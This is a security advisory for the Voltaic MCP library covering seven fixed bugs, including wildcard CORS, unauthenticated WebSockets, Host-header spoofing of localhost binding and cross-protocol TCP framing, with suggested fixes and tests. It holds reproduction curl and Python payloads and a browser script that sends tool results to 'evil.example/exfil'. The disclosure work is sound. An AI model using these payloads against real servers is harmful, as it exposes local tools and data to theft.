# Voltaic authentication, origin, and exposure bugs

**Status:** Fixed in Voltaic 2.1.0. See the v2.1.0 entry in `CHANGELOG.md` and the `Security.*` Touchstone suites.
**Affects:** Voltaic 2.0.0 and 1.1.0. Line numbers refer to the v2.0.0 source.
**Found by:** hardening a downstream Voltaic-based MCP server. Every bug below except where marked was then reproduced directly against Voltaic 2.0.0 with no downstream code involved.
**Tested on:** Windows 11 with the .NET 10 SDK.
**Related:** [`BUG_TO_FIX.md`](BUG_TO_FIX.md) (handshake sessions created for requests that never initialized). That bug is summarized in [Bug 7](#bug-7-unknown-and-client-chosen-session-ids-are-accepted-see-bug_to_fixmd) and not repeated here.

## Scope and design intent

- **TCP and stdio are intentionally unauthenticated.** Nothing here asks for auth on those transports. Bug 5 is about TCP accepting *HTTP* traffic, not about missing auth.
- **WebSocket should authenticate exactly like HTTP.** It should use the same HTTP headers on the upgrade request (`Authorization`, custom API-key headers), the same `AuthenticationHandler` shape, and the same `RpcCallContext` flow into handlers. Today it has none of this (Bugs 2 and 3).
- **Origin validation is required by the MCP spec** for HTTP-based transports ("Servers MUST validate the `Origin` header on all incoming connections to prevent DNS rebinding attacks", Streamable HTTP, Security Warning). It applies whether or not an `AuthenticationHandler` is configured.

## Summary

| # | Bug | Severity | Component | Reproduced on 2.0.0 |
|---|-----|----------|-----------|---------------------|
| 1 | `McpHttpServer` allows every origin by default (`Access-Control-Allow-Origin: *`), never validates `Origin`, and accepts `text/plain` bodies, so any web page can call tools and read the results | **Critical** (default config) | `McpHttpServer`, `A2AHttpServer` (by inspection) | Yes |
| 2 | `McpWebsocketsServer` has no authentication hook, no Origin check, and no access to the upgrade request, so any web page can open a socket and call tools | **Critical** (default config); blocks WebSocket auth entirely | `McpWebsocketsServer` | Yes |
| 3 | `McpWebsocketsClient` cannot send request headers, so it cannot connect to any authenticated WebSocket server | High (feature gap) | `McpWebsocketsClient` | Yes (API) |
| 4 | Binding to `localhost` is not a loopback binding on Windows: http.sys listens on all interfaces and matches `Host`, which a remote client can spoof | High | `McpHttpServer`, `McpWebsocketsServer`, `A2AHttpServer` (by inspection) | Yes |
| 5 | The TCP framing parser accepts an HTTP request, so a web page can invoke methods on `McpTcpServer` / `JsonRpcServer` with a plain `fetch()` | High | `MessageFraming`, `McpTcpServer`, `JsonRpcServer` | Yes |
| 6 | `AuthenticationResult` cannot set response headers, so a 401 cannot carry `WWW-Authenticate` (RFC 6750, MCP authorization spec) | Medium | `AuthenticationResult`, `McpHttpServer`, `A2AHttpServer` | Yes |
| 7 | Unknown and client-chosen `Mcp-Session-Id` values are accepted | Medium | `McpHttpServer` | Yes (details in `BUG_TO_FIX.md`) |

Bugs 1, 2, 4, and 5 all come from the same threat: **a web page in the user's browser, or a host on the local network, reaching a Voltaic server that the developer believes is local-only.** MCP servers commonly run on a developer workstation with access to databases, files, or credentials, and typically with no `AuthenticationHandler`.

---

## Bug 1: `McpHttpServer` allows every origin and never validates `Origin`

### Where

- `src/Voltaic/Mcp/McpHttpServer.cs:249-257`: defaults are `_EnableCors = true` and `_CorsHeaders` with `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Headers: *`.
- `McpHttpServer.cs:58-71`: `EnableCors` is documented as "the server will accept requests from any origin. Default is true to support browser-based clients."
- `McpHttpServer.cs:1122-1127` → `HandleCorsPreflightRequest` (`:1845-1855`): every preflight gets `204` plus the wildcard headers, for any origin.
- The wildcard `_CorsHeaders` are added to normal responses too (for example `:1336`, `:1366`, `:1428`, `:1640`, `:1761`, `:1891`, `:1907`, `:1983`), so cross-origin pages can **read** results.
- `HandleSseRequestAsync` (`:2002`, header at `:2021-2025`) hard-codes `Access-Control-Allow-Origin: *` and ignores `CorsHeaders`. A host that narrows `CorsHeaders` to a specific origin still sends `*` on `/events`.
- No code path reads `context.Request.Headers["Origin"]`.
- The same wildcard default exists in `src/Voltaic/A2A/A2AHttpServer.cs:256-263` (`EnableCors = true`, `Access-Control-Allow-Origin: *`). It was not separately reproduced, but the code path is equivalent.

### What goes wrong

1. **No preflight is needed at all.** The server accepts a JSON-RPC body sent as `Content-Type: text/plain`. That is a CORS "simple request", so a browser sends it immediately without asking. `fetch("http://localhost:PORT/mcp", {method: "POST", headers: {"Content-Type": "text/plain"}, body: ...})` from any site reaches the tool.
2. **The response is readable.** Every response carries `Access-Control-Allow-Origin: *`, so the page reads tool results (database rows, file contents, and so on), not just fires blind writes.
3. **With an explicit JSON content type, the preflight is approved for any origin.** It returns `204` with `Allow-Origin: *` and `Allow-Headers: *`.
4. **DNS rebinding.** Because `Origin` is never checked, a rebinding page (`attacker.example` re-resolving to `127.0.0.1`) is same-origin from the browser's point of view and needs no CORS at all. Validating `Origin` (and `Host`, see Bug 4) is the standard defence, and it is what the MCP spec requires.

**What does and doesn't protect the server:** a server with an `AuthenticationHandler` that checks an `Authorization: Bearer` token is not reachable this way. The page does not know the token, and per the Fetch spec a wildcard `Access-Control-Allow-Headers: *` does not cover `Authorization` (this last point is spec behaviour, not tested in a browser here). The exposure is the **default, unauthenticated** configuration, which is how most local MCP servers run, including every sample in this repo.

### Reproduction (Voltaic 2.0.0, harness below, `McpHttpServer("localhost", 18310)`, default settings)

```bash
# A. Preflight from a foreign origin is approved
curl -s -o /dev/null -D - -X OPTIONS http://localhost:18310/mcp \
  -H "Origin: https://evil.example" -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: content-type"
# HTTP/1.1 204 No Content
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Methods: POST, GET, OPTIONS
# Access-Control-Allow-Headers: *
# Access-Control-Expose-Headers: Mcp-Session-Id
# Access-Control-Max-Age: 86400

# B. "Simple" text/plain POST (what a page can send with no preflight) calls the tool, and the response is readable
curl -s -D - -X POST http://localhost:18310/mcp -H "Origin: https://evil.example" \
  -H "Content-Type: text/plain" -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"marker","arguments":{}}}'
# HTTP/1.1 200 OK
# Content-Type: application/json
# Access-Control-Allow-Origin: *
# {"jsonrpc":"2.0","result":{"content":[{"type":"text","text":"{\u0022invoked\u0022:\u0022http\u0022}"}]},"id":1}
# Server log: INVOKED transport=http caller=null

# C. Same on the /rpc compatibility endpoint
curl -s -D - -X POST http://localhost:18310/rpc -H "Origin: https://evil.example" \
  -H "Content-Type: text/plain" -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
# HTTP/1.1 200 OK
# Access-Control-Allow-Origin: *
# {"jsonrpc":"2.0","result":{"tools":[{"name":"marker",...}]},"id":1}
```

Note that request B also ran `tools/call` with no `initialize` and no session (see Bug 7).

Browser equivalent (illustrative only, not executed in a browser for this report; curl request B sends the same bytes a browser sends for this call):

```html
<script>
fetch("http://localhost:18310/mcp", {
  method: "POST",
  headers: { "Content-Type": "text/plain" },   // simple request: no preflight
  body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/call",
                         params: { name: "marker", arguments: {} } })
}).then(r => r.text()).then(t => fetch("https://evil.example/exfil", { method: "POST", body: t }));
</script>
```

### Suggested fix

1. **Validate `Origin` on every request, before routing, including `OPTIONS`.**
   - A request **without** an `Origin` header is a non-browser client: allow it.
   - A request **with** an `Origin` is allowed only if it is loopback (`http(s)://localhost`, `127.0.0.0/8`, or `[::1]` on any port) or matches the allowlist.
   - Otherwise return `403` and send **no** CORS headers.
2. **Echo the allowed origin instead of `*`,** and add `Vary: Origin`.
3. **Replace the wildcard `Access-Control-Allow-Headers: *` with an explicit list:** `Accept, Authorization, Content-Type, Last-Event-ID, Mcp-Method, Mcp-Name, MCP-Protocol-Version, Mcp-Session-Id`. Expose `Mcp-Session-Id, MCP-Protocol-Version`.
4. **Route `HandleSseRequestAsync` through the same CORS writer** instead of hard-coding `*`.
5. **Proposed API** (the same shape on `McpHttpServer`, `McpWebsocketsServer`, and `A2AHttpServer`):

   ```csharp
   /// Browser origins allowed in addition to loopback origins. "*" allows any origin (not recommended).
   public List<string> AllowedOrigins { get; set; } = new List<string>();

   /// When true (default), http(s)://localhost, 127.0.0.0/8, and [::1] origins are always allowed.
   public bool AllowLoopbackOrigins { get; set; } = true;

   /// Optional override; when set it replaces the built-in rule. Receives the raw Origin header (null when absent).
   public Func<string?, bool>? OriginValidator { get; set; }
   ```

6. **Optionally reject request bodies that are not `application/json`** on `/mcp` and `/rpc` with `415`. Streamable HTTP requires JSON, and this removes the preflight-free `text/plain` path entirely, even for an allowed origin.

**Compatibility:** browser-based clients served from a non-loopback origin would need to be added to `AllowedOrigins`. The MCP Inspector web UI runs on `localhost`, so it keeps working. Worth a `MIGRATE_V2_TO_V3.md` entry, or a minor-version note if you treat this as a security fix.

### Tests to add

- A preflight from a disallowed origin returns `403` with no `Access-Control-*` headers.
- A POST from a disallowed origin (`application/json` and `text/plain`) returns `403` and the handler is never invoked.
- Lookalike origins are rejected: `http://localhost.evil.example`, `http://127.0.0.1.evil.example`, `null`, `file://`, `chrome-extension://…`.
- A loopback origin is allowed and echoed, with `Vary: Origin`.
- An allowlisted origin is allowed. The same host on a different scheme or port is rejected.
- A request with no `Origin` is allowed (the non-browser client path).
- `/events` never sends `Access-Control-Allow-Origin: *` when `CorsHeaders` is narrowed.
- The same cases apply to `A2AHttpServer`.

---

## Bug 2: `McpWebsocketsServer` has no authentication hook and no Origin check

### Where

- `src/Voltaic/Mcp/McpWebsocketsServer.cs:903-928` (`HandleClientAsync`): the only check before `context.AcceptWebSocketAsync(null)` is `IsWebSocketRequest`. There is no `AuthenticationHandler`, no `Origin` check, and no hook that sees the `HttpListenerRequest`.
- The public surface has no `AuthenticationHandler` property. The `ClientConnected` event carries a `ClientConnection` (`Type`, `SessionId`, `LastActivity`, `TcpClient`, `Stream`, `WebSocket`, `TokenSource`), none of which exposes the upgrade request's headers, origin, or remote endpoint. So a host cannot even implement the check itself.
- The `RegisterTool` / `RegisterMethod` overloads that take `RpcCallContext?` exist on `McpWebsocketsServer`, but nothing ever pushes a context, so the caller is **always `null`** on WebSocket.

### What goes wrong

1. **Cross-site WebSocket hijacking.** Browsers do **not** apply CORS to WebSockets. Any page can run `new WebSocket("ws://localhost:PORT/mcp")`, and the browser sends that page's `Origin`. The server's Origin check is the only defence, and there is none. The page can then send any JSON-RPC message and read every reply.
2. **WebSocket cannot be authenticated at all.** It should support the same HTTP headers as REST (for example `Authorization: Bearer …` or an API-key header on the upgrade request, validated by the same `AuthenticationHandler` delegate). Today a host that needs auth has to put its own listener in front of Voltaic and proxy frames. That is what the downstream application had to do.

### Reproduction (Voltaic 2.0.0, `McpWebsocketsServer("localhost", 18312, "/mcp")`)

```bash
# D. Upgrade from a foreign origin is accepted
curl -s -m 3 -o /dev/null -w "%{http_code}\n" -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: https://evil.example" http://localhost:18312/mcp
# 101

# I. A full tools/call over a socket opened with Origin: https://evil.example (raw WebSocket client)
# upgrade: HTTP/1.1 101 Switching Protocols
# reply: {"jsonrpc":"2.0","result":{"content":[{"type":"text","text":"{\u0022invoked\u0022:\u0022ws\u0022}"}]},"id":1}
# Server log: INVOKED transport=ws caller=null
```

### Suggested fix

Mirror `McpHttpServer` exactly, so a host configures auth once and gets it on both transports:

```csharp
/// Same delegate type as McpHttpServer.AuthenticationHandler. Invoked with the upgrade request before
/// AcceptWebSocketAsync. On failure the server writes StatusCode/ErrorMessage (and Headers, see Bug 6)
/// and does not upgrade.
public Func<HttpListenerRequest, Task<AuthenticationResult>>? AuthenticationHandler { get; set; }

public List<string> AllowedOrigins { get; set; }            // as in Bug 1
public bool AllowLoopbackOrigins { get; set; } = true;
public Func<string?, bool>? OriginValidator { get; set; }
```

**Order in `HandleClientAsync`:**
1. Loopback-binding check (Bug 4).
2. Path check (`404`).
3. Origin (`403`).
4. `IsWebSocketRequest` (`400`).
5. `AuthenticationHandler` (its status code, default `401`).
6. `AcceptWebSocketAsync`.

**Carry the caller:**
- Store `new RpcCallContext(result.Principal, result.Claims)` on the `ClientConnection` (for example a `Caller` property).
- Wrap each request dispatch in `ReceiveLoopAsync` with `using (RpcCallContext.Push(client.Caller))`. Then `RpcCallContext.Current` and the `RpcCallContext?` handler overloads work on WebSocket the same way they do on HTTP.
- Expose the caller on `ClientConnection` so `ClientConnected` subscribers can see who connected.

**Also useful:** pass the requested `Sec-WebSocket-Protocol` through, so hosts can support clients that carry a token as a subprotocol (browsers cannot set `Authorization` on a WebSocket). This is optional; the header path is the primary one.

### Tests to add

- An upgrade from a disallowed origin returns `403` and the handler is never invoked. Loopback and allowlisted origins are accepted, and so is a request with no `Origin`.
- With an `AuthenticationHandler`, an upgrade without or with a wrong `Authorization` gets `401` (and `WWW-Authenticate`, Bug 6). A valid token upgrades.
- `RpcCallContext.Current` inside a WebSocket tool handler equals the authenticated principal and claims, and is `null` without a handler.
- A valid token from a disallowed origin is still rejected (`403`), so the token does not bypass the Origin check.

---

## Bug 3: `McpWebsocketsClient` cannot send request headers

### Where

- `src/Voltaic/Mcp/McpWebsocketsClient.cs:92-104`: `ConnectAsync(string url, CancellationToken token)` creates a new `ClientWebSocket` and sets only `Options.KeepAliveInterval`. There is no way to set request headers or subprotocols before `ConnectAsync`.
- By contrast, `McpHttpClient.SetRequestHeader(name, value)` (`McpHttpClient.cs:155-161`) exists and is applied to every request.

### What goes wrong

Once Bug 2 is fixed, Voltaic's own WebSocket client still cannot talk to an authenticated Voltaic WebSocket server. The downstream application's token-protected WebSocket tests had to use `System.Net.WebSockets.ClientWebSocket` directly, with `Options.SetRequestHeader("Authorization", …)`, instead of `McpWebsocketsClient`.

### Suggested fix

Match `McpHttpClient`:

```csharp
/// Adds or replaces a header sent on the WebSocket upgrade request. A null or empty value removes it.
/// Must be called before ConnectAsync; changes apply to the next connection.
public void SetRequestHeader(string name, string? value);

/// Optional: subprotocols to request (ClientWebSocket.Options.AddSubProtocol).
public void AddSubProtocol(string subProtocol);
```

In `ConnectAsync`, after `new ClientWebSocket()`, apply each stored header with `_WebSocket.Options.SetRequestHeader(name, value)` and each subprotocol with `_WebSocket.Options.AddSubProtocol(...)`. Keep header names case-insensitive, as `McpHttpClient` does.

### Tests to add

- The header is present on the upgrade request (assert server-side with the Bug 2 handler).
- Removing a header (null or empty value) takes effect on the next connect.
- An `McpWebsocketsClient` with a valid `Authorization` connects to an authenticated `McpWebsocketsServer`; without it, `ConnectAsync` fails.

---

## Bug 4: `localhost` binding accepts remote clients on Windows (Host-header spoofing)

### Where

- `McpHttpServer.StartAsync`, `src/Voltaic/Mcp/McpHttpServer.cs:676-680`: `_Listener.Prefixes.Add($"http://{_Hostname}:{_Port}/")`, and so on.
- `McpWebsocketsServer.StartAsync`, `src/Voltaic/Mcp/McpWebsocketsServer.cs:527`: the same pattern.
- `A2AHttpServer` uses the same `HttpListener` prefix pattern (by inspection, not reproduced).

### What goes wrong

On Windows, `HttpListener` is backed by http.sys:
- A prefix of `http://localhost:PORT/` does **not** bind a loopback socket. http.sys listens on `0.0.0.0` and `[::]` for the port and routes a request to the `localhost` registration by its **`Host` header**.
- Any host on the network can therefore reach a "localhost-only" Voltaic server by connecting to the machine's LAN address and sending `Host: localhost:PORT`.

On Linux and macOS, the managed `HttpListener` resolves `localhost` and binds loopback, so the behaviour differs by platform. That is itself a trap: code tested on one platform is exposed on the other.

Developers reasonably read `new McpHttpServer("localhost", 8080)` as "local only". The README examples use `"localhost"`.

### Reproduction (Windows, Voltaic 2.0.0, servers constructed with `"localhost"`)

```bash
# E. What is actually listening
netstat -ano | grep LISTEN | grep -E ":1831[025] "
# 0.0.0.0:18310   0.0.0.0:18312   0.0.0.0:18315   [::]:18310   [::]:18312   [::]:18315

# F. From the LAN address, spoofing Host: localhost -> the tool runs
curl -s -D - -X POST http://<lan-ip>:18310/mcp -H "Host: localhost:18310" \
  -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"marker","arguments":{}}}'
# HTTP/1.1 200 OK
# {"jsonrpc":"2.0","result":{"content":[{"type":"text","text":"{\u0022invoked\u0022:\u0022http\u0022}"}]},"id":1}
# Server log: INVOKED transport=http caller=null

# G. Without the spoof, http.sys rejects the host name
curl -s -o /dev/null -w "%{http_code}\n" http://<lan-ip>:18310/
# 400

# H. The same for WebSocket
curl -s -m 3 -o /dev/null -w "%{http_code}\n" -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Host: localhost:18312" http://<lan-ip>:18312/mcp
# 101
```

`<lan-ip>` is any non-loopback address of the machine running the server.

### Suggested fix

- **When the configured hostname is loopback** (`localhost`, any `127.0.0.0/8` literal, `::1`, `[::1]`), reject every request whose `context.Request.RemoteEndPoint.Address` is not loopback. Do this first in `HandleRequestAsync` / `HandleClientAsync`, with `403` (or just close the connection).
  - Map IPv4-mapped IPv6 addresses before testing (`IPAddress.IsIPv4MappedToIPv6` → `MapToIPv4()`, then `IPAddress.IsLoopback`).
  - Do not use `HttpListenerRequest.IsLocal`: it is also true for requests from the machine's own LAN address.
- **Document the binding semantics:** `+`/`*` means all interfaces, and `localhost` is enforced as loopback by Voltaic.
- **Optionally expose a property** such as `RequireLoopbackClients` (default: true when the hostname is loopback) for hosts that deliberately want the old behaviour.

This check was added in the downstream application's front listener and confirmed to block requests F and H (`403 Remote connections are not allowed.`), while loopback clients keep working.

### Tests to add

- Bound to `localhost`, a request arriving from a non-loopback local address with `Host: localhost:PORT` gets `403` on HTTP (POST and GET `/mcp`) and on the WebSocket upgrade. The test can discover a local non-loopback IPv4 address with `NetworkInterface.GetAllNetworkInterfaces()`, and skip if there is none. Accept "connection refused" as a pass on platforms that bind loopback.
- Bound to `localhost`, a loopback client works.
- Bound to `+`, a remote client is accepted (the existing behaviour is preserved when explicitly requested).
- Unit test: IPv4-mapped `127.0.0.1` counts as loopback, and IPv4-mapped `192.168.x.x` does not.

---

## Bug 5: the TCP framing parser accepts HTTP requests (cross-protocol)

### Where

- `src/Voltaic/Core/MessageFraming.cs:83-129` (`TryExtractMessage`) and `:153-169` (`ParseContentLength`). The parser looks for `\r\n\r\n`, then scans **every** header line for one starting with `Content-Length:`, and ignores all others. That includes an HTTP request line such as `POST / HTTP/1.1` and headers such as `Host:`, `Origin:`, and `Content-Type:`.
- `MaxHeaderSize` (1024) is only enforced while the header block is still incomplete (`:95-102`). A complete header block of any size is parsed.
- Used by `JsonRpcServer` (`src/Voltaic/Core/JsonRpcServer.cs:384`), and therefore by `McpTcpServer` (which extends `JsonRpcServer`), and by `JsonRpcClient`.

### What goes wrong

A web page can `fetch("http://127.0.0.1:TCPPORT/", {method: "POST", mode: "no-cors", headers: {"Content-Type": "text/plain"}, body: '{"jsonrpc":…}'})`.

The browser sends a normal HTTP request. Its `Content-Length` header matches the JSON body exactly, so Voltaic treats the whole HTTP header block as framing headers and **executes the body**. The page cannot read the reply, which is not valid HTTP, but any state-changing method or tool runs.

This is the same cross-protocol class of bug that has affected LSP and debug-adapter servers that use `Content-Length` framing on a TCP port. Browsers block some well-known ports, but not arbitrary high ports such as 8011.

Per the design intent, TCP stays unauthenticated. The fix is to make the parser strict so that browsers cannot speak to it.

### Reproduction (Voltaic 2.0.0, `McpTcpServer(IPAddress.Loopback, 18311)` and `JsonRpcServer(IPAddress.Loopback, 18313)`)

```bash
# J. McpTcpServer: an HTTP POST whose body is a framed tools/call
python -c "
import socket
body=b'{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/call\",\"params\":{\"name\":\"marker\",\"arguments\":{}}}'
req=b'POST / HTTP/1.1\r\nHost: 127.0.0.1:18311\r\nOrigin: https://evil.example\r\nContent-Type: text/plain\r\nContent-Length: '+str(len(body)).encode()+b'\r\n\r\n'+body
s=socket.create_connection(('127.0.0.1',18311)); s.sendall(req); s.settimeout(3); print(s.recv(400).decode())"
# Content-Length: 110
# Content-Type: application/json; charset=utf-8
# (JSON-RPC result follows)
# Server log: INVOKED transport=tcp caller=null

# K. JsonRpcServer: same, calling a plain method
printf 'POST / HTTP/1.1\r\nHost: 127.0.0.1:18313\r\nOrigin: https://evil.example\r\nContent-Type: text/plain\r\nContent-Length: 44\r\n\r\n{"jsonrpc":"2.0","id":1,"method":"marker"}\n\n' | python -c "
import socket,sys
s=socket.create_connection(('127.0.0.1',18313)); s.sendall(sys.stdin.buffer.read()); s.settimeout(3); print(s.recv(400).decode())"
# Content-Length: 43
# Content-Type: application/json; charset=utf-8
#
# {"jsonrpc":"2.0","result":"invoked","id":1}
# Server log: INVOKED transport=jsonrpc-tcp
```

### Suggested fix

Make `MessageFraming` accept only the LSP-style header grammar:

1. **Every header line** must be `Content-Length: <digits>` or `Content-Type: <value>`, matched case-insensitively. The first line in particular must be one of those. Any other line (an HTTP request line, `Host:`, `Origin:`, `User-Agent:`) raises `InvalidDataException`, and the server closes the connection without invoking anything.
2. **Enforce `MaxHeaderSize`** on the complete header block as well, not only while waiting for `\r\n\r\n`.
3. **Optionally**, fail fast if the first bytes look like an HTTP method (`GET `, `POST `, `PUT `, `OPTIONS `, `HEAD `, `DELETE `, `PATCH `, `CONNECT `, `TRACE `), and log it.

Voltaic's own `JsonRpcClient` / `McpTcpClient` already write only `Content-Length` and `Content-Type` (`MessageFraming.WriteMessageAsync`, `MessageFraming.cs:179-190`), so this does not affect Voltaic-to-Voltaic traffic. Third-party LSP-style clients also send only those two headers.

The downstream application enforced rule 1 (first line only) in a front listener, confirmed to drop request J before it reaches Voltaic.

### Tests to add

- An HTTP POST with a valid `Content-Length` and JSON body is dropped, and no handler runs. This applies to both `JsonRpcServer` and `McpTcpServer`.
- Unframed garbage (`hello\n`) is dropped.
- A header block with an unknown header line is rejected.
- An oversized complete header block is rejected.
- Framed requests with `Content-Length` alone, or `Content-Length` plus `Content-Type` in either order, still work.

---

## Bug 6: an authentication failure cannot set response headers (`WWW-Authenticate`)

### Where

- `src/Voltaic/Core/AuthenticationResult.cs`: the only members are `IsAuthenticated`, `Principal`, `Claims`, `StatusCode`, and `ErrorMessage`.
- `McpHttpServer.cs:1169-1192`: on failure, the server writes `StatusCode`, the wildcard CORS headers (Bug 1), and `ErrorMessage` as `text/plain`. There is no way to add headers.
- `A2AHttpServer` uses the same `AuthenticationResult` (by inspection).

### What goes wrong

- **The standards require the header.** RFC 6750 §3 requires `WWW-Authenticate: Bearer …` on a `401` for bearer-token auth. The MCP authorization spec requires the `401` to carry `WWW-Authenticate` with `resource_metadata` so clients can discover the authorization server.
- **Hosts cannot shape how clients react to a 401.** MCP clients treat a `401` as the start of the OAuth flow. Against the downstream application's front listener, which sends a bare `WWW-Authenticate: Bearer`, the MCP Inspector CLI attempted interactive OAuth and Claude Code 2.1.281 attempted Dynamic Client Registration ("Dynamic Client Registration rejected (HTTP 401): Missing or invalid bearer token"). A Voltaic host cannot send even that bare challenge, let alone `resource_metadata` or `error="invalid_token"`. Whether a fuller challenge changes those clients' behaviour was not tested.
- **Hosts can't send `Retry-After` either** for rate-limit style rejections.
- **Failure responses grant CORS to every origin** (`:1175-1179`). This is harmless on its own, but it should follow the Bug 1 origin rules.

### Reproduction (Voltaic 2.0.0, `McpHttpServer` with an `AuthenticationHandler` requiring `Authorization: Bearer good`)

```bash
# L. No token
curl -s -D - -X POST http://localhost:18315/mcp -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" -H "Origin: https://evil.example" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"marker","arguments":{}}}'
# HTTP/1.1 401 Unauthorized
# Access-Control-Allow-Origin: *
# denied
# (no WWW-Authenticate header; AuthenticationResult has no way to add one)

# M. Valid token works, and the caller reaches the handler
#    -> 200, server log: INVOKED transport=http-auth caller=good-user
```

### Suggested fix

```csharp
/// Headers to add to the response when authentication fails (for example WWW-Authenticate, Retry-After).
/// Ignored when IsAuthenticated is true.
public Dictionary<string, string> Headers { get; set; } = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
```

Then write these headers in `McpHttpServer`, `McpWebsocketsServer` (Bug 2), and `A2AHttpServer` failure paths. It would also help to add a helper such as `AuthenticationResult.BearerChallenge(string? resourceMetadataUrl = null, string? error = null)` that fills `StatusCode = 401` and a correctly formatted `WWW-Authenticate`.

### Tests to add

- Headers set on a failed `AuthenticationResult` appear on the `401` for HTTP and for the WebSocket upgrade.
- `BearerChallenge` produces `WWW-Authenticate: Bearer resource_metadata="…"`.
- A failure response to a disallowed origin carries no CORS grant.

---

## Bug 7: unknown and client-chosen session IDs are accepted (see `BUG_TO_FIX.md`)

Fully documented in [`BUG_TO_FIX.md`](BUG_TO_FIX.md). It is independently confirmed on 2.0.0 in two ways:
- a `tools/list` carrying `Mcp-Session-Id: not-a-real-session` returned `200` with the full tool list;
- request B above ran `tools/call` with no `initialize` and no session.

Spec: requests with an unrecognized session ID must get `404`, and requests without one (other than `initialize`) should get `400`.

It is listed here because it interacts with auth. A session ID is not bound to the principal that created it. With an `AuthenticationHandler`, each request is still authenticated, so this is not a bypass on its own. However, any authenticated caller can adopt or guess another session's ID, and per-session state (the negotiated version, SSE notifications on `/events` and `GET /mcp`) is not isolated by caller.

When fixing Bug 7, consider **binding sessions to the authenticated principal**: store the `RpcCallContext.Principal` on the session at `initialize`, and reject later requests on that session from a different principal with `404`.

---

## Verification

Each bug was reproduced against Voltaic 2.0.0 with a marker tool that logged every invocation, so the server log (not only the response) showed what ran. The fixes in 2.1.0 are covered by the `Security.Policies`, `Security.HttpServers`, `Security.WebSocket`, `Security.Framing`, and `McpHttp.Sessions` Touchstone suites, and each negative case was confirmed to fail with its protection disabled.

## Suggested order of work

1. **Bug 1 and Bug 2 Origin validation.** These are the critical default-config exposures, and they share one Origin policy implementation.
2. **Bug 4.** It is small and shares the loopback helpers with Bug 1.
3. **Bug 5.** It is a local change to `MessageFraming`.
4. **Bug 2 `AuthenticationHandler` and Bug 3 `SetRequestHeader`,** which give WebSocket auth parity with HTTP.
5. **Bug 6 response headers,** needed for spec-conformant 401s on HTTP and WebSocket.
6. **Bug 7,** per `BUG_TO_FIX.md`, optionally with sessions bound to the principal.

Bugs 1, 4, and 5 change default behaviour for browser-based and remote clients, so they should get a migration note: which origins or bind addresses to configure to restore previous access.
